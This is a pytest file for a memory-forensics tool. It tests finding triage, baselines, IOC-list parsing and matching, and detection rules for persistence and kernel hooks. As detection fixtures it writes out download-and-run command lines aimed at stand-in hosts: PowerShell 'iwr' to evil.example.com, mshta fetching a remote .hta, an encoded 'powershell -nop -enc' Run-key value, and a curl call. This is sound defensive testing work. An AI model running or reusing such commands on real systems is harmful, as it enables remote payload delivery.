"""Triage store (reviewed / false positive / notes / bookmarks / baselines) and the user-supplied IOC rule family."""
import json

import pytest

from test_pipeline_and_runner import FIXTURE, env, load_fixture_result, make_dump, run_provider, settings
from test_roadmap_features import plugin


def fresh():
    return load_fixture_result(established=True)


def finding(result, rule_id="PT-003", pid=3828):
    return next(i for i in result.indications if i.rule_id == rule_id and i.process_pid == pid)


# ============================================================================= triage decisions
def test_false_positive_leaves_scores_and_survives_reanalysis_and_save_load(tmp_path):
    from app.analysis import case_state
    from app.analysis.indicators.scoring import risk_by_pid
    from app.analysis.pipeline import reanalyze
    from app.models import load_analysis_result, save_analysis_result
    result = fresh()
    ind = finding(result)
    before = risk_by_pid(result.indications)[3828].score
    case_state.set_finding_status(result, ind, "false_positive", "lab machine")
    assert ind.triage == "false_positive" and ind.triage_note == "lab machine"
    after = risk_by_pid(result.indications).get(3828)
    assert after is None or after.score < before
    assert ind in result.indications                                      # hidden, never deleted

    rebuilt = reanalyze(result)                                           # rules re-run: the decision is carried over
    assert finding(rebuilt).triage == "false_positive" and finding(rebuilt, pid=6120).triage == ""
    path = tmp_path / "case.json.gz"
    save_analysis_result(rebuilt, str(path))
    loaded = load_analysis_result(str(path))                              # and through the file
    assert finding(loaded).triage == "false_positive"
    assert finding(reanalyze(loaded)).triage == "false_positive"


def test_reviewed_keeps_counting_reopen_restores_and_status_is_validated():
    from app.analysis import case_state
    from app.analysis.indicators.scoring import risk_by_pid
    result = fresh()
    ind = finding(result)
    score = risk_by_pid(result.indications)[3828].score
    case_state.set_finding_status(result, ind, "reviewed")
    assert ind.triage == "reviewed" and risk_by_pid(result.indications)[3828].score == score
    case_state.set_finding_status(result, ind, "false_positive")
    case_state.set_finding_status(result, ind, "open")
    assert ind.triage == "" and risk_by_pid(result.indications)[3828].score == score
    with pytest.raises(ValueError):
        case_state.set_finding_status(result, ind, "bogus")


def test_finding_keys_distinguish_reused_pids_and_signatures_ignore_pids():
    from app.analysis import case_state
    result = fresh()
    a, b = finding(result), finding(result, pid=6120)
    pa = next(p for p in result.processes if p.pid == 3828)
    assert case_state.finding_key(a, pa) != case_state.finding_key(b, None)
    assert case_state.finding_key(a, pa) == case_state.finding_key(a, pa)
    reused = type(pa)(**{**pa.__dict__, "create_time": "2030-01-01T00:00:00+00:00"})
    assert case_state.finding_key(a, pa) != case_state.finding_key(a, reused)          # same PID, other process
    assert case_state.finding_signature(a, pa) == case_state.finding_signature(a, reused)


def test_garbled_or_missing_case_data_is_tolerated(tmp_path):
    from app.analysis import case_state
    from app.models import analysis_result_to_dict, load_analysis_result
    result = fresh()
    result.case = {"notes": "garbage", "findings": [], "bookmarks": 5, "baselines": [{"name": "x"}, "junk"]}
    case_state.apply_case(result)
    case = result.case
    assert case["notes"] == [] and case["findings"] == {} and case["bookmarks"] == {} and case["baselines"] == []
    data = analysis_result_to_dict(fresh())
    data.pop("case")
    data["schema_version"] = 3                                             # a file saved before the case existed
    path = tmp_path / "old.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    assert load_analysis_result(str(path)).case["notes"] == []


def test_rerun_of_failed_plugins_keeps_the_investigators_work(tmp_path):
    from app.analysis import case_state
    from app.engines.windows.analysis.real_provider import RealProvider
    broken, _ = run_provider(tmp_path, {"FAKE_VOL_FAIL": "windows.netscan"})
    case_state.set_finding_status(broken, finding(broken), "reviewed", "seen")
    case_state.toggle_bookmark(broken, "process", "process|system|4|x", "System (PID 4)", 4)
    with env(MEMORYGRAPH_HOME=str(tmp_path / "home"), FAKE_VOL_FIXTURE=str(FIXTURE)):
        fixed = RealProvider(settings(tmp_path)).rerun(broken)
    assert finding(fixed).triage == "reviewed" and finding(fixed).triage_note == "seen"
    assert "process|system|4|x" in fixed.case["bookmarks"]


# ============================================================================= notes, bookmarks, report
def test_notes_bookmarks_and_markdown_report(tmp_path):
    from app.analysis import case_state
    result = fresh()
    proc = next(p for p in result.processes if p.pid == 4)
    target = case_state.process_target(proc)
    assert case_state.toggle_bookmark(result, "process", target, "System (PID 4)", 4) is True
    assert case_state.has_marks(result, target) == (True, False)
    note = case_state.add_note(result, "process", target, "System (PID 4)", "  talks to odd host  ", 4)
    assert note["text"] == "talks to odd host" and case_state.notes_for(result, target) == [note]
    with pytest.raises(ValueError):
        case_state.add_note(result, "process", target, "x", "   ")
    case_state.set_finding_status(result, finding(result), "false_positive", "known")
    path = tmp_path / "notes.md"
    case_state.export_markdown(result, str(path))
    text = path.read_text(encoding="utf-8")
    assert "System (PID 4)" in text and "talks to odd host" in text and "False positive" in text and "reason: known" in text
    assert case_state.toggle_bookmark(result, "process", target, "System (PID 4)", 4) is False
    assert case_state.delete_note(result, note["id"]) and not case_state.delete_note(result, note["id"])


# ============================================================================= baselines
def test_baseline_from_a_clean_dump_suppresses_the_same_findings_elsewhere(tmp_path):
    from app.analysis import case_state
    from app.analysis.indicators.scoring import risk_by_pid
    clean = fresh()
    path = tmp_path / "clean.json"
    procs = {p.pid: p for p in clean.processes}
    expected = len({case_state.finding_signature(i, procs.get(i.process_pid)) for i in clean.indications})
    assert case_state.export_baseline(clean, str(path), name="clean-host") == expected > 0
    other = fresh()
    other.indications.append(type(other.indications[0])(title="Brand new thing", severity="High", process_pid=4, process_name="System", rule_id="X-001"))
    name, count = case_state.import_baseline(other, str(path))
    assert name == "clean-host" and count > 0
    suppressed = [i for i in other.indications if i.triage == "baseline"]
    assert len(suppressed) == len(other.indications) - 1                      # everything except the new finding
    assert "clean-host" in suppressed[0].triage_note
    new = next(i for i in other.indications if i.rule_id == "X-001")
    assert new.triage == "" and risk_by_pid(other.indications).keys() == {4}
    case_state.set_finding_status(other, finding(other), "open")             # explicit re-open beats the baseline
    assert finding(other).triage == ""
    assert case_state.remove_baseline(other, "clean-host") and all(i.triage == "" for i in other.indications)


def test_baseline_from_false_positives_only_and_bad_files(tmp_path):
    from app.analysis import case_state
    result = fresh()
    case_state.set_finding_status(result, finding(result), "false_positive")
    path = tmp_path / "fp.json"
    assert case_state.export_baseline(result, str(path), only_false_positives=True) == 1
    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["format"] == "memorygraph-baseline" and data["entries"][0]["rule_id"] == "PT-003"
    junk = tmp_path / "junk.json"
    junk.write_text('{"hello": 1}', encoding="utf-8")
    for bad in (junk, tmp_path / "missing.json"):
        with pytest.raises(ValueError):
            case_state.import_baseline(fresh(), str(bad))


# ============================================================================= IOC parsing and matching
LIST = r"""
# comment
203.0.113.7   # team server
198.51.100.0/24
evil.example.com
hxxps://bad[.]example.net/path
44d88612fea8a8f36de82e1278abb02f
mutex: Global\XyzMutex
file: C:\Users\Public\payload.exe
payload.exe
ip, 192.0.2.5, Cobalt Strike
nonsense line here
domain: not a domain
"""


def test_ioc_list_parsing_normalises_and_reports_bad_lines():
    from app.analysis.ioc import parse_ioc_text
    items, warnings = parse_ioc_text(LIST, "intel.txt")
    summary = [(i.kind, i.value) for i in items]
    assert ("ip", "203.0.113.7/32") in summary and ("ip", "198.51.100.0/24") in summary and ("ip", "192.0.2.5/32") in summary
    assert ("domain", "evil.example.com") in summary                        # .com is a TLD, not a file extension
    assert ("domain", "bad.example.net") in summary                         # defanged URL -> host
    assert ("hash", "44d88612fea8a8f36de82e1278abb02f") in summary
    assert ("mutex", "global\\xyzmutex") in summary
    assert ("file", "\\users\\public\\payload.exe") in summary and ("file", "payload.exe") in summary     # drive letter dropped
    assert next(i for i in items if i.value == "203.0.113.7/32").note == "team server"
    assert next(i for i in items if i.value == "192.0.2.5/32").note == "Cobalt Strike"
    assert len(warnings) == 2 and "line 12" in warnings[0] and all("intel.txt" in w for w in warnings)


def test_ioc_matching_rules():
    from app.analysis.ioc import IocSet, parse_ioc_text
    s = IocSet(parse_ioc_text(LIST, "t")[0])
    assert s.match_ip("198.51.100.77") and s.match_ip("203.0.113.7") and not s.match_ip("203.0.113.8") and not s.match_ip("not-an-ip")
    assert s.match_domains("powershell iwr http://c2.sub.evil.example.com/a") and not s.match_domains("http://notevil.example.com.au/")
    assert s.match_domains("curl bad.example.net") and not s.match_domains("cmd.exe /c dir")
    assert s.match_hash("44D88612FEA8A8F36DE82E1278ABB02F") and not s.match_hash("00" * 16) and not s.match_hash("")
    assert s.match_mutex("\\BaseNamedObjects\\Global\\XyzMutex") and s.match_mutex("Global\\XyzMutex") and not s.match_mutex("Global\\Other")
    assert s.match_file("C:\\Users\\bob\\AppData\\Local\\Temp\\PAYLOAD.EXE") and s.match_file("\\Users\\Public\\payload.exe")
    assert not s.match_file("C:\\Windows\\System32\\notpayload.exe")


def test_ioc_files_from_settings(tmp_path):
    from app.analysis.ioc import load_from_settings
    good = tmp_path / "list.txt"
    good.write_text("203.0.113.7\n", encoding="utf-8")
    assert load_from_settings({}) == (None, [])
    found, problems = load_from_settings({"ioc_files": [str(good), str(tmp_path / "gone.txt")]})
    assert len(found) == 1 and len(problems) == 1 and "gone.txt" in problems[0]


# ============================================================================= IOC rule family
def iocs(text=LIST):
    from app.analysis.ioc import IocSet, parse_ioc_text
    return IocSet(parse_ioc_text(text, "intel.txt")[0])


def evaluate(result, ioc_set=None):
    from app.engines.windows.indicators.engine import IndicatorEngine
    return IndicatorEngine(iocs=ioc_set).evaluate(result)


def test_ioc_rules_never_change_the_behavioural_findings():
    base = evaluate(fresh())
    result = fresh()
    conn = next(c for c in result.connections if c.remote_address == "8.253.176.103")
    found = evaluate(result, iocs(f"{conn.remote_address}\n"))
    behavioural = [(f.rule_id, f.process_pid, f.title, f.severity, f.score) for f in found if f.category != "ioc"]
    assert behavioural == [(f.rule_id, f.process_pid, f.title, f.severity, f.score) for f in base]
    hits = [f for f in found if f.rule_id == "IOC-001"]
    assert hits and all(f.category == "ioc" and f.title.startswith("IOC match:") for f in hits)
    assert hits[0].process_pid == conn.pid and "intel.txt" in " ".join(hits[0].reasons)
    assert hits[0].evidence_items[0].field == "ForeignAddr" and hits[0].source_plugins


def test_ioc_findings_are_not_fed_into_behavioural_correlation():
    result = fresh()
    proc = next(p for p in result.processes if p.pid == 7252)               # already has a Medium finding
    proc.command_line = "powershell iwr http://c2.evil.test/x"
    proc.path = "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe"      # (this also triggers real behavioural rules: that is fine)
    without = evaluate(result)
    found = evaluate(result, iocs("evil.test\nfile: payload.exe\n"))
    assert {"IOC-002", "IOC-005"} <= {f.rule_id for f in found}

    def corr(items):
        return sorted((f.rule_id, f.process_pid, f.title, f.severity) for f in items if f.rule_id.startswith("CORR"))
    assert corr(found) == corr(without)                                    # identical: the IOC hits added nothing to correlation


def test_ioc_domain_mutex_file_and_yara_rules():
    result = fresh()
    explorer = next(p for p in result.processes if p.name == "explorer.exe")
    explorer.command_line = "powershell -c iwr http://a.evil.example.com/p"
    explorer.handles.append({"type": "Mutant", "name": "Global\\XyzMutex", "value": "0x4", "access": 1})
    result.plugins += [
        plugin("windows.mutantscan", [{"Offset": 1, "Name": "\\BaseNamedObjects\\Global\\XyzMutex"}]),
        plugin("windows.filescan", [{"Offset": 2, "Name": "\\Users\\Public\\payload.exe"}]),
        plugin("windows.vadyarascan", [{"PID": explorer.pid, "Rule": "Evil_Rule", "Component": "$a", "Value": "abc", "Offset": 16}]),
    ]
    found = {f.rule_id: [x for x in evaluate(result, iocs()) if x.rule_id == f.rule_id] for f in evaluate(result, iocs())}
    assert len(found["IOC-002"]) == 1 and found["IOC-002"][0].process_pid == explorer.pid
    mutex = found["IOC-004"]
    assert sorted(f.process_pid for f in mutex) == [0, explorer.pid]                   # pool scan has no owner; the handle does
    files = found["IOC-005"]
    assert any(f.evidence_items[0].source_plugin == "windows.filescan" and f.severity == "High" for f in files)
    yara = found["IOC-006"][0]
    assert yara.process_pid == explorer.pid and "Evil_Rule" in yara.title and yara.evidence_items[0].row_index == 0


def test_without_an_ioc_list_only_yara_hits_can_appear():
    result = fresh()
    assert not [f for f in evaluate(result) if f.category == "ioc"]
    result.plugins.append(plugin("windows.vadyarascan", [{"PID": 4, "Rule": "R", "Component": "$a", "Value": "x", "Offset": 1}]))
    assert [f.rule_id for f in evaluate(result) if f.category == "ioc"] == ["IOC-006"]


def test_ioc_rules_end_to_end_through_the_provider_and_reanalysis(tmp_path):
    from app.analysis.pipeline import reanalyze
    from app.engines.windows.analysis.real_provider import RealProvider
    list_path = tmp_path / "intel.txt"
    list_path.write_text("8.253.176.103\n", encoding="utf-8")
    with env(MEMORYGRAPH_HOME=str(tmp_path / "home"), FAKE_VOL_FIXTURE=str(FIXTURE)):
        result = RealProvider(settings(tmp_path, ioc_files=[str(list_path), str(tmp_path / "missing.txt")])).run(make_dump(tmp_path))
    assert any(f.rule_id == "IOC-001" for f in result.indications)
    assert any("missing.txt" in w for w in result.warnings)                           # a bad list is a warning, not a failure
    assert not any(f.rule_id == "IOC-001" for f in reanalyze(result).indications)       # no IOC set passed: family absent, nothing else changes


def test_ioc_family_is_catalogued_and_has_explicit_attack_entries():
    from app.engines.windows.indicators.attack import ATTACK_BY_RULE
    from app.engines.windows.indicators.engine import RULE_CATALOG, rule_name
    for rule_id in ("IOC-001", "IOC-002", "IOC-004", "IOC-005", "IOC-006"):
        assert rule_id in RULE_CATALOG and rule_id in ATTACK_BY_RULE and ATTACK_BY_RULE[rule_id] == ()
        assert RULE_CATALOG[rule_id].category == "ioc" and rule_name(rule_id) != rule_id


# ============================================================================= rules for the new plugins
def with_plugins(*plugins):
    result = fresh()
    result.plugins = list(result.plugins) + list(plugins)
    return result


def by_rule(result, rule_id):
    return [f for f in evaluate(result) if f.rule_id == rule_id]


def test_file_object_rule_groups_and_ignores_normal_files():
    rows = [{"Offset": i, "Name": n} for i, n in enumerate([
        "\\Users\\Public\\a.exe", "\\Users\\bob\\Downloads\\setup.exe", "\\Users\\bob\\Documents\\invoice.pdf.exe",
        "\\Windows\\System32\\cmd.exe", "\\Users\\bob\\Downloads\\readme.txt", "\\Windows\\Temp\\x.dll"])]
    found = by_rule(with_plugins(plugin("windows.filescan", rows)), "FILE-001")
    assert sorted(f.severity for f in found) == ["Low", "Medium", "Medium"]
    low = next(f for f in found if f.severity == "Low")
    assert "setup.exe" in " ".join(low.evidence) and "cmd.exe" not in " ".join(low.evidence)
    strict = next(f for f in found if "Public" in f.title)
    assert {e.row_index for e in strict.evidence_items} == {0, 5}
    assert by_rule(with_plugins(plugin("windows.filescan", rows[3:5])), "FILE-001") == []


def test_userassist_rule():
    rows = [{"Name": "C:\\Users\\Public\\x.exe", "Count": 3, "Last Updated": "2018-06-21T01:00:00+00:00"},
            {"Name": "C:\\Users\\bob\\Downloads\\y.exe", "Count": 1, "Last Updated": None},
            {"Name": "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\cmd.exe", "Count": 9}, {"Name": "C:\\Windows\\notepad.exe", "Count": 5}]
    found = by_rule(with_plugins(plugin("windows.registry.userassist", rows)), "UA-001")
    assert sorted(f.severity for f in found) == ["Low", "Medium"]
    assert "x.exe" in " ".join(next(f for f in found if f.severity == "Medium").evidence)
    assert by_rule(with_plugins(plugin("windows.registry.userassist", rows[2:])), "UA-001") == []


def test_run_key_rule_reads_every_printkey_invocation():
    key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    rows = [{"Type": "Key", "Key": key, "Name": "Sub", "Data": "C:\\Users\\Public\\ignored.exe"},
            {"Type": "REG_SZ", "Key": key, "Name": "Updater", "Data": "C:\\Users\\Public\\u.exe", "Last Write Time": "2018-06-21T00:00:00+00:00"},
            {"Type": "REG_SZ", "Key": key, "Name": "Chat", "Data": "\"C:\\Program Files\\Chat\\chat.exe\" --autostart"},
            {"Type": "REG_SZ", "Key": key, "Name": "Enc", "Data": "powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB"},
            {"Type": "REG_SZ", "Key": key, "Name": "Hta", "Data": "mshta.exe http://x.test/a.hta"}]
    result = with_plugins(plugin("windows.registry.printkey [Run, user]", rows), plugin("windows.registry.printkey [RunOnce, user]", rows[:2]),
                          plugin("windows.registry.printkey [Run, machine]", [], "Failed"))
    found = {f.title.split("'")[1]: f for f in by_rule(result, "PER-001")}
    assert set(found) == {"Updater", "Enc", "Hta"}                      # same value in two runs is reported once; keys and normal entries are not
    assert found["Updater"].severity == "Medium" and found["Enc"].severity == "Medium" and found["Hta"].severity == "Low"
    assert found["Updater"].source_plugins == ["windows.registry.printkey [Run, user]"]


def test_environment_rule_groups_by_odd_value():
    rows = [{"PID": 100, "Process": "a.exe", "Variable": "COMSPEC", "Value": "C:\\Windows\\System32\\cmd.exe"},
            {"PID": 200, "Process": "b.exe", "Variable": "ComSpec", "Value": "C:\\Users\\Public\\cmd.exe"},
            {"PID": 201, "Process": "c.exe", "Variable": "COMSPEC", "Value": "C:\\Users\\Public\\cmd.exe"},
            {"PID": 100, "Process": "a.exe", "Variable": "SystemRoot", "Value": "C:\\Windows"},
            {"PID": 300, "Process": "d.exe", "Variable": "windir", "Value": "D:\\Temp\\win"}, {"PID": 300, "Process": "d.exe", "Variable": "PATH", "Value": "x"}]
    found = by_rule(with_plugins(plugin("windows.envars", rows)), "ENV-001")
    assert len(found) == 2 and any("2 process(es)" in f.title for f in found)
    assert by_rule(with_plugins(plugin("windows.envars", rows[:1] + rows[3:4])), "ENV-001") == []


MODULES = [{"Base": 0x1000, "Size": 0x1000, "Name": "ntoskrnl.exe"}, {"Base": 0x5000, "Size": 0x2000, "Name": "tcpip.sys"}]


def test_driver_object_rule():
    drivers = [{"Start": 0x1100, "Driver Name": "\\Driver\\ntoskrnl", "Name": "\\Driver\\ntoskrnl"},        # inside a loaded module
               {"Start": 0x9000, "Driver Name": "\\Driver\\tcpip", "Name": "\\Driver\\tcpip"},               # outside, but a module has that name
               {"Start": 0x9000, "Driver Name": "\\Driver\\evil", "Name": "\\Driver\\evil"}]
    found = by_rule(with_plugins(plugin("windows.modules", MODULES), plugin("windows.driverscan", drivers)), "DRV-002")
    assert len(found) == 1 and "1 driver object" in found[0].title and "evil" in found[0].evidence[0] and found[0].confidence == "Low"
    assert by_rule(with_plugins(plugin("windows.driverscan", drivers)), "DRV-002") == []                    # needs windows.modules too


def test_ssdt_rule_finds_foreign_modules_and_holes():
    clean = [{"Index": i, "Address": 0x1000 + i, "Module": "ntoskrnl", "Symbol": f"Nt{i}"} for i in range(5)]
    assert by_rule(with_plugins(plugin("windows.ssdt", clean)), "SSDT-001") == []
    hooked = [dict(r) for r in clean if r["Index"] != 3]
    hooked[2]["Module"] = "evil"
    found = by_rule(with_plugins(plugin("windows.ssdt", hooked)), "SSDT-001")
    assert len(found) == 1 and any("evil" in r for r in found[0].reasons) and any("index" in r for r in found[0].reasons)
    assert found[0].evidence_items[0].value == "evil" and found[0].evidence_items[0].source_plugin == "windows.ssdt"


def test_callback_rule():
    rows = [{"Type": "PsSetCreateProcessNotifyRoutine", "Callback": 0x1111, "Module": "ntoskrnl.exe", "Symbol": "x", "Detail": None},
            {"Type": "PsSetLoadImageNotifyRoutine", "Callback": 0x2222, "Module": None, "Symbol": None, "Detail": "-"},
            {"Type": "IoRegisterShutdownNotification", "Callback": 0x3333, "Module": "N/A", "Symbol": None, "Detail": None}]
    found = by_rule(with_plugins(plugin("windows.callbacks", rows)), "CBK-001")
    assert len(found) == 1 and "2 kernel callback" in found[0].title
    assert by_rule(with_plugins(plugin("windows.callbacks", rows[:1])), "CBK-001") == []


def test_unlisted_image_rule_needs_dlllist_and_ignores_wow64_and_private_maps():
    result = fresh()
    proc = next(p for p in result.processes if p.dlls)
    known = proc.dlls[0]
    rows = [{"PID": proc.pid, "File": "\\Windows\\System32\\" + known.name, "Protection": "PAGE_EXECUTE_WRITECOPY", "PrivateMemory": 0},
            {"PID": proc.pid, "File": "\\Users\\bob\\AppData\\Local\\Temp\\evil.dll", "Protection": "PAGE_EXECUTE_WRITECOPY", "PrivateMemory": 0},
            {"PID": proc.pid, "File": "\\Users\\bob\\AppData\\Local\\Temp\\private.dll", "Protection": "PAGE_EXECUTE_READ", "PrivateMemory": 1},
            {"PID": proc.pid, "File": "\\Users\\bob\\AppData\\Local\\Temp\\data.dll", "Protection": "PAGE_READONLY", "PrivateMemory": 0},
            {"PID": proc.pid, "File": "\\Windows\\System32\\ntdll.dll", "Protection": "PAGE_EXECUTE_WRITECOPY", "PrivateMemory": 0}]
    proc.wow64 = True
    proc.dlls = [d for d in proc.dlls if d.name.lower() != "ntdll.dll"]
    result.plugins.append(plugin("windows.vadinfo", rows))
    found = by_rule(result, "VAD-001")
    assert len(found) == 1 and found[0].process_pid == proc.pid and found[0].severity == "Medium"
    assert found[0].evidence == ["\\Users\\bob\\AppData\\Local\\Temp\\evil.dll"] and found[0].confidence == "Low"
    result.plugins = [p for p in result.plugins if p.name != "windows.dlllist"]                                # no module lists: stay silent
    assert by_rule(result, "VAD-001") == []


# ============================================================================= plugin arguments through the provider
def run_with(tmp_path, data_extra, **settings_extra):
    from app.engines.windows.analysis.real_provider import RealProvider
    data = json.loads(FIXTURE.read_text(encoding="utf-8"))
    data.update(data_extra)
    fixture = tmp_path / "fixture.json"
    fixture.write_text(json.dumps(data), encoding="utf-8")
    events = []
    with env(MEMORYGRAPH_HOME=str(tmp_path / "home"), FAKE_VOL_FIXTURE=str(fixture), **settings_extra.pop("env", {})):
        result = RealProvider(settings(tmp_path, **settings_extra)).run(make_dump(tmp_path), None, lambda n, s, d: events.append((n, s)))
    return result, events


def test_run_keys_choice_runs_printkey_four_times_with_arguments(tmp_path):
    key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    rows = [{"Type": "REG_SZ", "Key": key, "Name": "Updater", "Data": "C:\\Users\\Public\\u.exe"}]
    result, events = run_with(tmp_path, {"windows.registry.printkey": rows}, optional_plugins=["run_keys"])
    labels = [p for p in result.plugins if p.name.startswith("windows.registry.printkey [")]
    assert len(labels) == 4 and all(p.status == "Completed" for p in labels)
    assert all("windows.registry.printkey" in p.command and "--key" in p.command for p in labels)
    assert {p.command[p.command.index("--key") + 1] for p in labels} == {
        "Microsoft\\Windows\\CurrentVersion\\Run", "Microsoft\\Windows\\CurrentVersion\\RunOnce", key, key + "Once"}
    assert [f.rule_id for f in result.indications if f.rule_id == "PER-001"] == ["PER-001"]


def test_vadyarascan_needs_a_rule_file_and_passes_it_on(tmp_path):
    rows = [{"PID": 4, "Rule": "Evil_Rule", "Component": "$a", "Value": "x", "Offset": 1}]
    skipped, events = run_with(tmp_path, {"windows.vadyarascan": rows}, optional_plugins=["windows.vadyarascan"])
    assert not any(p.name == "windows.vadyarascan" for p in skipped.plugins)
    assert any("skipped" in w and "yara_rules_file" in w for w in skipped.warnings)
    rules = tmp_path / "rules.yar"
    rules.write_text("rule Evil_Rule { condition: true }", encoding="utf-8")
    ran, _ = run_with(tmp_path, {"windows.vadyarascan": rows}, optional_plugins=["windows.vadyarascan"], yara_rules_file=str(rules))
    scan = next(p for p in ran.plugins if p.name == "windows.vadyarascan")
    assert scan.status == "Completed" and scan.command[-2:] == ["--yara-file", str(rules)]
    assert any(f.rule_id == "IOC-006" for f in ran.indications)


def test_missing_yara_dependency_is_reported_as_unavailable_plugin(tmp_path):
    from test_volatility_compat import ALL_PLUGINS
    rules = tmp_path / "rules.yar"
    rules.write_text("rule R { condition: true }", encoding="utf-8")
    result, _ = run_with(tmp_path, {}, optional_plugins=["windows.vadyarascan"], yara_rules_file=str(rules),
                         env={"FAKE_VOL_PLUGINS": ALL_PLUGINS})
    scan = next(p for p in result.plugins if p.name == "windows.vadyarascan")
    assert scan.status == "Failed" and "yara-python" in scan.error and "not available" in scan.error
    assert result.processes                                                  # the investigation went on
